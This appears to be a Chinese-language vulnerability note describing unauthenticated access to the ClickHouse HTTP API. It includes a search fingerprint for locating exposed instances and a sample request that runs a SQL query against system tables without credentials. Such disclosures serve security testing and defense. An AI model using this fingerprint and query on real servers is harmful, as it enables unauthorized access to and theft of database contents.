# ClickHouse API 数据库接口未授权访问漏洞

## 漏洞描述

ClickHouse API 数据库接口存在未授权访问漏洞，攻击者通过漏洞可以执行任意SQL命令获取数据库数据

## 漏洞影响

<a-checkbox checked>ClickHouse</a-checkbox></br>

## 网络测绘

<a-checkbox checked>"ClickHouse" && body="ok"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1628562111049-29c2abe1-632c-4b49-8139-c320c7642949.png)

执行SQL语句

![img](../../../.vuepress/public/img/1628562146369-a7f2b43b-64a6-4d94-b003-6df41a71af4e.png)

```php
/?query=SELECT%20*%20FROM%20system.query_thread_log%20LIMIT%201%20FORMAT%20Vertical
```

![img](../../../.vuepress/public/img/1628562659696-09dac222-48dc-47c6-9da8-e22203478a73.png)